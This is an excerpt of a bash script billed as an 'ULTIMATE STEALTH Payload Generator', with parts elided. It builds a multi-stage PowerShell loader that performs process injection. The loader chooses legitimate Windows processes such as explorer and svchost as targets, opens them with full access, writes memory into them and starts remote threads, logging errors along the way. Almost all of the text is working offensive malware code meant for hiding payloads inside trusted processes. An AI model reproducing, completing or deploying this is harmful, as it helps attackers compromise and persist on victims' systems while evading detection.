#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – Process Injection Edition with Full Error Logging
...
# ========== STAGE 3 (PowerShell payload loader) with PROCESS INJECTION and ERROR LOGGING ==========
echo -e "${YELLOW}[4/6] Creating Stage3.ps1 (process injection with detailed error logs)...${NC}"
...
# Add Win32 API definitions with error handling
...
# --- Process injection with fallback ---
Write-Log "Preparing process injection..."

# Define target processes in order of preference (explorer runs at user level, easier to access)
$targetProcesses = @("explorer", "RuntimeBroker", "svchost", "dllhost")
$target = $null
...
# Use minimal required access rights
$accessFlags = 0x1F0FFF  # PROCESS_ALL_ACCESS equivalent (for now)
Write-Log "Opening process with access: 0x1F0FFF"
$hProcess = [Win32.Kernel32]::OpenProcess($accessFlags, $false, $target.Id)
if ($hProcess -eq 0) {
...
if (-not $result) {
    $err = Get-LastWin32Error
    Write-Log "WriteProcessMemory failed: $err"
    [Win32.Kernel32]::CloseHandle($hProcess)
    exit
}
Write-Log "WriteProcessMemory succeeded, bytes written: $bytesWritten"
...
if ($hThread -eq [IntPtr]::Zero) {
    $err = Get-LastWin32Error
    Write-Log "CreateRemoteThread failed: $err"
} else {
